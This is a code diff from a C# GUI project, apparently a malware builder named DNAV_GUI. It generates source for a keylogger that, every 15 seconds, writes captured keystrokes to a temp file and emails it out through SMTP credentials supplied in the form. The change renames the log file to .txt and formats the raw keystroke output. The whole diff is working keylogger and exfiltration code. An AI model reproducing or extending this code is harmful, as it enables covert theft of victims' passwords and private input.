@@ -1291,7 +1291,7 @@ namespace DNAV_GUI
                 if (keyloggerEmailCheckbox.IsChecked == true)
                 {
                     code += "Thread keyloggerMailer = new Thread(() => {Mailer m = new Mailer(\"" + emailToTextbox.Text + "\", \"" + emailFromTextbox.Text + "\", \"" + emailUsernameTextbox.Text + "\", \"" + emailPasswordTextbox.Password + "\", " + emailPortTextbox.Text + ", \"" + emailSMTPTextbox.Text + "\");while(true){Thread.Sleep(15000);";
-                    code += "string tmp = Path.GetTempFileName();StreamWriter sw = new StreamWriter(tmp);sw.WriteLine(Keylogger.Keys);sw.Close();";
+                    code += "string tmp = Path.GetTempFileName(); tmp = tmp.Replace(\".tmp\", \".txt\"); StreamWriter sw = new StreamWriter(tmp);sw.WriteLine(Keylogger.CompileRawOutput(Keylogger.Keys));sw.Close();";
                     code += "m.send(\"Log\", \"Log im Anhang\", tmp);}});keyloggerMailer.Start();";
                     
                 }
